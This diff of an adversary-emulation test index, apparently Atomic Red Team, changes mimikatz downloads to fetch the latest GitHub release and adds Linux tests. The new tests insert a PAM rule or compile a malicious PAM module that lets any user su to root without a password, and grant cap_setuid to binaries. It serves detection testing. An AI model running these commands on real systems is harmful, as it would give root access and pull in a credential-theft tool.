+        elevation_required: false
   T1600.002:
     technique:
       id: attack-pattern--7efba77e-3bc4-4ca5-8292-d8201dcd64b5
@@ -30531,7 +31230,8 @@ defense-evasion:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210724/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -30690,7 +31390,8 @@ defense-evasion:
 '
         get_prereq_command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\Mimi.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\Mimi.zip"
           Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
           New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
           Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
@@ -31179,7 +31880,100 @@ defense-evasion:
       x_mitre_platforms:
       - Linux
       - macOS
-    atomic_tests: []
+      identifier: T1556.003
+    atomic_tests:
+    - name: Malicious PAM rule
+      auto_generated_guid: 4b9dde80-ae22-44b1-a82a-644bf009eb9c
+      description: |
+        Inserts a rule into a PAM config and then tests it.
+
+        Upon successful execution, this test will insert a rule that allows every user to su to root without a password.
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_pam_conf:
+          description: PAM config file to modify.
+          type: string
+          default: "/etc/pam.d/su-l"
+        pam_rule:
+          description: Rule to add to the PAM config.
+          type: string
+          default: auth sufficient pam_succeed_if.so uid >= 0
+        index:
+          description: Index where the rule is inserted.
+          type: integer
+          default: 1
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'sudo sed -i "#{index}s,^,#{pam_rule}\n,g" #{path_to_pam_conf}
+
+'
+        cleanup_command: 'sudo sed -i "\,#{pam_rule},d" #{path_to_pam_conf}
+
+'
+    - name: Malicious PAM module
+      auto_generated_guid: 65208808-3125-4a2e-8389-a0a00e9ab326
+      description: |
+        Creates a PAM module, inserts a rule to use it, and then tests it.
+
+        Upon successful execution, this test will create a PAM module that allows every user to su to root without a password.
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_pam_conf:
+          description: PAM config file to modify.
+          type: string
+          default: "/etc/pam.d/su-l"
+        pam_rule:
+          description: Rule to add to the PAM config.
+          type: string
+          default: auth sufficient /tmp/pam_evil.so
+        index:
+          description: Index where the rule is inserted.
+          type: integer
+          default: 1
+        path_to_pam_module_source:
+          description: Path to PAM module source code.
+          type: path
+          default: PathToAtomicsFolder/T1556.003/src/pam_evil.c
+        path_to_pam_module:
+          description: Path to PAM module object
+          type: path
+          default: "/tmp/pam_evil.so"
+      dependencies:
+      - description: 'The PAM development library must be installed to build the PAM
+          module
+
+'
+        prereq_command: 'if [ -f /usr/include/security/pam_modules.h ]; then exit
+          0; else exit 1; fi;
+
+'
+        get_prereq_command: 'if [ -n "`which apt-get`" ]; then sudo apt-get -y install
+          libpam0g-dev; elif [ -n "`which yum`" ]; then sudo yum -y install pam-devel;
+          fi
+
+'
+      - description: 'The PAM module must exist on disk at specified location (#{path_to_pam_module})
+
+'
+        prereq_command: 'if [ -f #{path_to_pam_module} ]; then exit 0; else exit 1;
+          fi;
+
+'
+        get_prereq_command: 'sudo gcc -shared -fPIC -o #{path_to_pam_module} #{path_to_pam_module_source}
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'sudo sed -i "#{index}s,^,#{pam_rule}\n,g" #{path_to_pam_conf}
+
+'
+        cleanup_command: 'sudo sed -i "\,#{pam_rule},d" #{path_to_pam_conf}
+
+'
   T1205.001:
     technique:
       external_references:
@@ -31821,7 +32615,8 @@ defense-evasion:
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -33011,7 +33806,8 @@ defense-evasion:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -34119,6 +34915,52 @@ defense-evasion:
           sudo chown root #{file_to_setuid}
           sudo chmod g+s #{file_to_setuid}
         cleanup_command: 'sudo rm #{file_to_setuid}
+
+'
+        name: sh
+        elevation_required: true
+    - name: Make and modify capabilities of a binary
+      auto_generated_guid: db53959c-207d-4000-9e7a-cd8eb417e072
+      description: |
+        Make and modify [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) of a C source code file.
+        The binary doesn't have to modify the UID, but the binary is given the capability to arbitrarily modify it at any time with `setuid(0)`.
+        Without being owned by root, the binary can set the UID to 0.
+      supported_platforms:
+      - linux
+      input_arguments:
+        payload:
+          description: cap.c payload
+          type: path
+          default: PathToAtomicsFolder/T1548.001/src/cap.c
+      executor:
+        command: |
+          cp #{payload} /tmp/cap.c
+          make /tmp/cap
+          sudo setcap cap_setuid=ep /tmp/cap
+          /tmp/cap
+        cleanup_command: |
+          rm /tmp/cap
+          rm /tmp/cap.c
+        name: sh
+        elevation_required: true
+    - name: Provide the SetUID capability to a file
+      auto_generated_guid: 1ac3272f-9bcf-443a-9888-4b1d3de785c1
+      description: 'This test gives a file the capability to set UID without using
+        flags.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        file_to_setcap:
+          description: Path of file to provide the SetUID capability
+          type: path
+          default: "/tmp/evilBinary"
+      executor:
+        command: |
+          touch #{file_to_setcap}
+          sudo setcap cap_setuid=ep #{file_to_setcap}
+        cleanup_command: 'rm #{file_to_setcap}
 
 '
         name: sh
@@ -44022,7 +44864,100 @@ persistence:
       x_mitre_platforms:
       - Linux
       - macOS
-    atomic_tests: []
+      identifier: T1556.003
+    atomic_tests:
+    - name: Malicious PAM rule
+      auto_generated_guid: 4b9dde80-ae22-44b1-a82a-644bf009eb9c
+      description: |
+        Inserts a rule into a PAM config and then tests it.
+
+        Upon successful execution, this test will insert a rule that allows every user to su to root without a password.
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_pam_conf:
+          description: PAM config file to modify.
+          type: string
+          default: "/etc/pam.d/su-l"
+        pam_rule:
+          description: Rule to add to the PAM config.
+          type: string
+          default: auth sufficient pam_succeed_if.so uid >= 0
+        index:
+          description: Index where the rule is inserted.
+          type: integer
+          default: 1
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'sudo sed -i "#{index}s,^,#{pam_rule}\n,g" #{path_to_pam_conf}
+
+'
+        cleanup_command: 'sudo sed -i "\,#{pam_rule},d" #{path_to_pam_conf}
+
+'
+    - name: Malicious PAM module
+      auto_generated_guid: 65208808-3125-4a2e-8389-a0a00e9ab326
+      description: |
+        Creates a PAM module, inserts a rule to use it, and then tests it.
+
+        Upon successful execution, this test will create a PAM module that allows every user to su to root without a password.
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_pam_conf:
+          description: PAM config file to modify.
+          type: string
+          default: "/etc/pam.d/su-l"
+        pam_rule:
+          description: Rule to add to the PAM config.
+          type: string
+          default: auth sufficient /tmp/pam_evil.so
+        index:
+          description: Index where the rule is inserted.
+          type: integer
+          default: 1
+        path_to_pam_module_source:
+          description: Path to PAM module source code.
+          type: path
+          default: PathToAtomicsFolder/T1556.003/src/pam_evil.c
+        path_to_pam_module:
+          description: Path to PAM module object
+          type: path
+          default: "/tmp/pam_evil.so"
+      dependencies:
+      - description: 'The PAM development library must be installed to build the PAM
+          module
+
+'
+        prereq_command: 'if [ -f /usr/include/security/pam_modules.h ]; then exit
+          0; else exit 1; fi;
+
+'
+        get_prereq_command: 'if [ -n "`which apt-get`" ]; then sudo apt-get -y install
+          libpam0g-dev; elif [ -n "`which yum`" ]; then sudo yum -y install pam-devel;
+          fi
+
+'
+      - description: 'The PAM module must exist on disk at specified location (#{path_to_pam_module})
+
+'
+        prereq_command: 'if [ -f #{path_to_pam_module} ]; then exit 0; else exit 1;
+          fi;
+
+'
+        get_prereq_command: 'sudo gcc -shared -fPIC -o #{path_to_pam_module} #{path_to_pam_module_source}
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'sudo sed -i "#{index}s,^,#{pam_rule}\n,g" #{path_to_pam_conf}
+
+'
+        cleanup_command: 'sudo sed -i "\,#{pam_rule},d" #{path_to_pam_conf}
+
+'
   T1205.001:
     technique:
       external_references:
@@ -63139,7 +64074,8 @@ lateral-movement:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210724/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -63298,7 +64234,8 @@ lateral-movement:
 '
         get_prereq_command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\Mimi.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\Mimi.zip"
           Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
           New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
           Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
